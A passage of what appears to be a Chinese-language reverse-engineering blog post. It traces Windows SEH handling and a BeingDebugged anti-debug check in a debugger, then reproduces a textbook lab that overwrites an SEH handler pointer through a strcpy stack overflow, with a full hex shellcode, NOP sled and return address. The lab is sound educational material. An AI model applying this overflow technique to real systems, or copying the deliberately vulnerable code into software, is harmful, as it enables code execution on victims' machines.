ContextFlags;</span><br><span class="line"></span><br><span class="line">    DWORD   Dr0;</span><br><span class="line">    DWORD   Dr1;</span><br><span class="line">    DWORD   Dr2;</span><br><span class="line">    DWORD   Dr3;</span><br><span class="line">    DWORD   Dr6;</span><br><span class="line">    DWORD   Dr7;</span><br><span class="line"></span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line">    </span><br><span class="line">    DWORD   SegGs;</span><br><span class="line">    DWORD   SegFs;</span><br><span class="line">    DWORD   SegEs;</span><br><span class="line">    DWORD   SegDs;</span><br><span class="line"></span><br><span class="line">    DWORD   Edi;</span><br><span class="line">    DWORD   Esi;</span><br><span class="line">    DWORD   Ebx;</span><br><span class="line">    DWORD   Edx;</span><br><span class="line">    DWORD   Ecx;</span><br><span class="line">    DWORD   Eax;</span><br><span class="line"></span><br><span class="line">    DWORD   Ebp;</span><br><span class="line">    DWORD   Eip;	<span class="comment">//offset=0xB8</span></span><br><span class="line">    DWORD   SegCs;              <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;</span><br><span class="line">    DWORD   SegSs;<span class="comment">//C8</span></span><br><span class="line"></span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line"></span><br><span class="line">&#125; CONTEXT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> CONTEXT *PCONTEXT;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">==&gt;    0019F470   |0001007F</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+4      0019F474   |004011C2                                  返回到 seh.004011C2 来自 seh.00401000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+8      0019F478   |00000000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+C      0019F47C   |00000000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+10     0019F480   |00000000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+14     0019F484   |FFFF0FF0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+18     0019F488   |00000100</span></span><br><span class="line">省略浮点数寄存器</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+88     0019F4F8   |00000000	;segGS</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+8C     0019F4FC   |0000002B</span>	</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+90     0019F500   |00000053	;FS</span>	</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+94     0019F504   |0000002B	;ES</span>	</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+98     0019F508   |0000002B   ;DS</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+9C     0019F50C   |00401219   ;EDI                            seh.&lt;ModuleEntryPoint&gt;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+A0     0019F510   |00401219   ;ESI                            seh.&lt;ModuleEntryPoint&gt;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+A4     0019F514   |002CF000	;Ebx</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+A8     0019F518   |005BF5B8	;Edx</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+AC     0019F51C   |00000001	;Ecx</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+B0     0019F520   |00000000	;Eax</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+B4     0019F524   |0019FF74	;EBP</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+B8     0019F528   |00401019   ;Eip                               seh.00401019</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+BC     0019F52C   |00000023	;CS</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+C0     0019F530   |00010246	;Eflags</span>	</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+C4     0019F534   |0019FF28	;Esp</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+C8     0019F538   |0000002B	;segSS</span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>其中eip指向0x401019,这还是发生内存异常的那条指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00401019 mov     dword ptr [eax], 1</span><br></pre></td></tr></table></figure>
+
+<h4 id="myHandler-0x40105A"><a href="#myHandler-0x40105A" class="headerlink" title="myHandler@0x40105A"></a>myHandler@0x40105A</h4><p>分析完了函数以及返回地址,现在将焦点放到该异常处理函数身上</p>
+<p>此时的堆栈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0019F320   77B08BF2  返回到 ntdll.77B08BF2	;返回地址</span><br><span class="line">0019F324   0019F420	;第一个参数,pRecord</span><br><span class="line">0019F328   0019FF28	;第二个参数,pFrame</span><br><span class="line">0019F32C   0019F470	;第三个参数,pContext</span><br><span class="line">0019F330   0019F3AC  UNICODE &quot;48&quot;;第四个参数,pValue</span><br></pre></td></tr></table></figure>
+
+<h5 id="把context放到esi上"><a href="#把context放到esi上" class="headerlink" title="把context放到esi上"></a>把context放到esi上</h5><p>第一条指令</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924151509557.png" alt="image-20220924151509557"></p>
+<p>esp+0xC此时指向第三个参数,即pContext</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924151452776.png" alt="image-20220924151452776"></p>
+<p>这里解引用了一下,就把Context的基地址放到esi上了</p>
+<h5 id="将PEB放到eax上"><a href="#将PEB放到eax上" class="headerlink" title="将PEB放到eax上"></a>将PEB放到eax上</h5><p>fs选择子指向TEB的描述符,TEB+0x30指向PEB</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924151603919.png" alt="image-20220924151603919"></p>
+<p>将TEB的基地址放到了eax上</p>
+<h5 id="检测是否beingdebugged"><a href="#检测是否beingdebugged" class="headerlink" title="检测是否beingdebugged"></a>检测是否beingdebugged</h5><p>第三条指令,取了PEB+0x2的一个字节的值,和1进行比较,</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924152038006.png" alt="image-20220924152038006"></p>
+<p>PEB+0x2存放的就是BeingDebugged,如果正在被调试,一般该值会置1,</p>
+<p>如果该值为1则和1的差就是0,ZF就置1</p>
+<p>否则如果该值为0则和1的差不为0,ZF置0</p>
+<h5 id="jnz-0x00401076"><a href="#jnz-0x00401076" class="headerlink" title="jnz 0x00401076"></a>jnz 0x00401076</h5><p>实际调试的时候,刚才的计算结果不为0,即ZF&#x3D;1,jnz跳转</p>
+<blockquote>
+<p>说也奇怪,使用od调试运行的,为啥这里没有检测出调试器呢?</p>
+<p>od调试运行时不会检测出调试器,但是x32dbg调试运行就会检测出调试器</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924152418482.png" alt="image-20220924152418482"></p>
+<h5 id="修改context-Eip"><a href="#修改context-Eip" class="headerlink" title="修改context.Eip"></a>修改context.Eip</h5><p>本函数一开始就将context的基地址放到了esi上,现在将0x401039放到[esi+0xB8]这个地方,也就是context+0xB8&#x3D;Eip</p>
+<p>这意味着,本seh节点的异常处理函数,将context上下文中的eip,根据当前是否被调试,从事故现场,改到了其他没有事故的函数中.这也就是该seh节点的异常处理策略</p>
+<p>当本次异常处理结束之后,控制将会交给0x401039</p>
+<blockquote>
+<p>0x401039处的函数干了啥呢?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00401039 loc_401039:                             ; DATA XREF: .text:loc_401076↓o</span><br><span class="line">.text:00401039                 push    0               ; uType</span><br><span class="line">.text:0040103B                 push    offset Caption  ; &quot;ReverseCore&quot;</span><br><span class="line">.text:00401040                 push    offset aHello   ; &quot;Hello :)&quot;</span><br><span class="line">.text:00401045                 push    0               ; hWnd</span><br><span class="line">.text:00401047                 call    ds:MessageBoxA</span><br><span class="line">.text:0040104D</span><br><span class="line">.text:0040104D loc_40104D:                             ; CODE XREF: _main+37↑j</span><br><span class="line">.text:0040104D                 pop     large dword ptr fs:0</span><br><span class="line">.text:00401054                 add     esp, 4</span><br><span class="line">.text:00401057                 retn</span><br><span class="line">.text:00401057 _main           endp</span><br></pre></td></tr></table></figure>
+
+<p>首先弹窗</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924153224967.png" alt="image-20220924153224967"></p>
+<p>然后指令<code>pop     large dword ptr fs:0</code>就把这个第一个seh节点给扬了,留作后话</p>
+</blockquote>
+<h5 id="返回"><a href="#返回" class="headerlink" title="返回"></a>返回</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924152852356.png" alt="image-20220924152852356"></p>
+<p>在修改完context.Eip之后,函数尾声将eax置就返回了</p>
+<h3 id="删除seh节点"><a href="#删除seh节点" class="headerlink" title="删除seh节点"></a>删除seh节点</h3><p>由于异常处理函数中将context.eip改成了0x401039,在该函数上下断点,然后Ctrl+F8自动步过,直到执行到断点位置</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924153704246.png" alt="image-20220924153704246"></p>
+<p>这里会首先弹窗</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924153224967.png" alt="image-20220924153224967"></p>
+<p>然后</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924154538315.png" alt="image-20220924154538315"></p>
+<p>这条指令干了啥呢?</p>
+<p>fs:0先前分析过,指向的是seh链的附加头节点,现在将栈顶弹给seh链的附加头节点,栈顶是谁呢?</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924154743820.png" alt="image-20220924154743820"></p>
+<p>指向下一个SEH记录的指针,将这个指针的值,即下一个seh节点的地址,放到seh链的附加头节点ExceptionList上,恰好就把main一开始注册的seh节点扬了</p>
+<p>为啥这么巧栈顶此时就是下一个seh节点的指针呢?</p>
+<p>因为堆栈平衡.0x401039是在main函数中的,当控制转移到0x401039时相当于在main中执行,此时的栈顶就是main刚注册完seh节点的状态</p>
+<h3 id="返回到-tmainCRTStartup"><a href="#返回到-tmainCRTStartup" class="headerlink" title="返回到___tmainCRTStartup"></a>返回到<code>___tmainCRTStartup</code></h3><p>在<code>0x401039</code>函数retn之前,栈顶上存放的是<code>0x4011C2</code>,将要作为返回地址了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924155304450.png" alt="image-20220924155304450"></p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924155235397.png" alt="image-20220924155235397"></p>
+<p>这是要返回到哪里去呢?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:004011AB                 mov     dword_40AF88, eax</span><br><span class="line">.text:004011B0                 push    eax             ; envp</span><br><span class="line">.text:004011B1                 push    argv            ; argv</span><br><span class="line">.text:004011B7                 push    argc            ; argc</span><br><span class="line">.text:004011BD                 call    _main           ; 异常处理函数地址压栈</span><br><span class="line">.text:004011C2                 add     esp, 0Ch</span><br><span class="line">.text:004011C5                 mov     [ebp+var_20], eax</span><br><span class="line">.text:004011C8                 cmp     [ebp+var_1C], 0</span><br></pre></td></tr></table></figure>
+
+<p>一眼顶针,原来是返回到<code>___tmainCRTStartup</code>了</p>
+<h2 id="栈溢出修改seh函数指针"><a href="#栈溢出修改seh函数指针" class="headerlink" title="栈溢出修改seh函数指针"></a>栈溢出修改seh函数指针</h2><p>SEH节点都是在栈帧中的,缓冲区溢出可以修改SEH节点中的异常处理函数地址,改成shellcode</p>
+<p>书上给出的有漏洞的例子</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] =</span><br><span class="line">	<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;got an exception, press Enter to kill process!\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="type">int</span> zero = <span class="number">0</span>;</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	_try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(buf, input); <span class="comment">// overrun the stack</span></span><br><span class="line">		zero = <span class="number">4</span> / zero;	<span class="comment">// generate an exception</span></span><br><span class="line">	&#125;</span><br><span class="line">	_except(MyExceptionhandler()) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在windows 2000上直接运行,由于test函数中有一个int 3中断,程序会在此报错然后启动调试</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924200524109.png" alt="image-20220924200524109"></p>
+<p>在int 3之前,0x40106B到0x40107C位置已经注册过seh节点</p>
+<p>怎么注册的?</p>
+<p>将原来的附加头节点中存储的第一个seh节点的地址作为当前节点的后继指针值,当前节点的异常处理函数注册为0x401518</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201147624.png" alt="image-20220924201147624"></p>
+<p>奇怪的是,这个0x401518也是原来的第一个seh节点的注册异常处理函数</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201233090.png" alt="image-20220924201233090"></p>
+<p>两个seh节点指向了同一异常处理函数</p>
+<p>在栈帧视图上</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201413301.png" alt="image-20220924201413301"></p>
+<p>新注册的seh节点的异常处理函数指针在EBP-0xC位置</p>
+<p>下面要调用strcpy函数了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201631140.png" alt="image-20220924201631140"></p>
+<p>首先将ebp+8位置的源串指针压栈作为strcpy的第二个参数</p>
+<p>然后将ebp-0xe0位置的目标缓冲区压栈作为第一个参数</p>
+<p>然后调用strcpy@0x401330,调用完后栈帧的状态</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201848804.png" alt="image-20220924201848804"></p>
+<p>缓冲区已经顶到了ebp-0x18,[ebp-0x18]正好是’\0’</p>
+<p>再输入12个字节的填充就到了seh节点异常处理函数指针的家门口了,然后往这里写入四个字节的shellcode的地址</p>
+<p>因此这个缓冲区可以写212字节的填充+3字节的shellcode地址,剩下一个字节正好是’\0’填到地址的高位</p>
+<p>下面就是shellcode的构造了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]= </span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> </span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> </span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span> </span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span> </span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span> </span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span> </span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span> </span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span> </span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span> </span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span> </span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span> </span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span> </span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> </span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x94\xFE\x12&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>前面的字节都填充成0x90即nop指令,一是为了充当pad,二是为了增加命中率,只要是控制调到这些nop指令中,就会顺序执行到shellcode</p>
+<p>最后三个字节是0x12FE94,而shellcode的基地址就是0x12FE94,也就是说将shellcode的基地址溢出到了seh节点中的异常处理函数指针上了,</p>
+<p>就算是写0x12FE95,0x12FE96等等也都可以,nop已经把靶阔的很大了</p>
+<p>然后除以0异常,而刚才被溢出的seh节点又恰好在seh链上首当其冲</p>
+<p>因此shellcode就被当作异常处理函数调用了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924210055100.png" alt="image-20220924210055100"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/reverse/" rel="tag"># reverse</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/09/24/todolist/" rel="prev" title="ToDoList">
+      <i class="fa fa-chevron-left"></i> ToDoList
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/10/17/%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/" rel="next" title="词法分析">
+      词法分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SEH"><span class="nav-number">1.</span> <span class="nav-text">SEH</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SEH%E9%93%BE"><span class="nav-number">1.1.</span> <span class="nav-text">SEH链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E8%BF%9B%E7%A8%8BSEH%E9%93%BE"><span class="nav-number">1.2.</span> <span class="nav-text">访问进程SEH链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85SEH%E8%8A%82%E7%82%B9"><span class="nav-number">1.3.</span> <span class="nav-text">安装SEH节点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E8%A7%82%E5%AF%9FSEH%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-number">1.4.</span> <span class="nav-text">调试观察SEH工作流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#main%E4%B9%8B%E5%89%8D%E5%BB%BA%E7%AB%8B%E7%9A%84seh%E9%93%BE"><span class="nav-number">1.4.1.</span> <span class="nav-text">main之前建立的seh链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E6%96%B0%E7%9A%84seh%E8%8A%82%E7%82%B9"><span class="nav-number">1.4.2.</span> <span class="nav-text">注册新的seh节点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E5%8F%91%E5%BC%82%E5%B8%B8"><span class="nav-number">1.4.3.</span> <span class="nav-text">引发异常</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.4.</span> <span class="nav-text">执行异常处理函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Record-0x19F420"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">Record@0x19F420</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Frame-0x19FF28"><span class="nav-number">1.4.4.2.</span> <span class="nav-text">Frame@0x19FF28</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Context-0x19F470"><span class="nav-number">1.4.4.3.</span> <span class="nav-text">Context@0x19F470</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#myHandler-0x40105A"><span class="nav-number">1.4.4.4.</span> <span class="nav-text">myHandler@0x40105A</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%8Acontext%E6%94%BE%E5%88%B0esi%E4%B8%8A"><span class="nav-number">1.4.4.4.1.</span> <span class="nav-text">把context放到esi上</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%86PEB%E6%94%BE%E5%88%B0eax%E4%B8%8A"><span class="nav-number">1.4.4.4.2.</span> <span class="nav-text">将PEB放到eax上</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6beingdebugged"><span class="nav-number">1.4.4.4.3.</span> <span class="nav-text">检测是否beingdebugged</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#jnz-0x00401076"><span class="nav-number">1.4.4.4.4.</span> <span class="nav-text">jnz 0x00401076</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9context-Eip"><span class="nav-number">1.4.4.4.5.</span> <span class="nav-text">修改context.Eip</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E"><span class="nav-number">1.4.4.4.6.</span> <span class="nav-text">返回</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A0%E9%99%A4seh%E8%8A%82%E7%82%B9"><span class="nav-number">1.4.5.</span> <span class="nav-text">删除seh节点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E5%88%B0-tmainCRTStartup"><span class="nav-number">1.4.6.</span> <span class="nav-text">返回到___tmainCRTStartup</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BF%AE%E6%94%B9seh%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88"><span class="nav-number">1.5.</span> <span class="nav-text">栈溢出修改seh函数指针</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">78</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
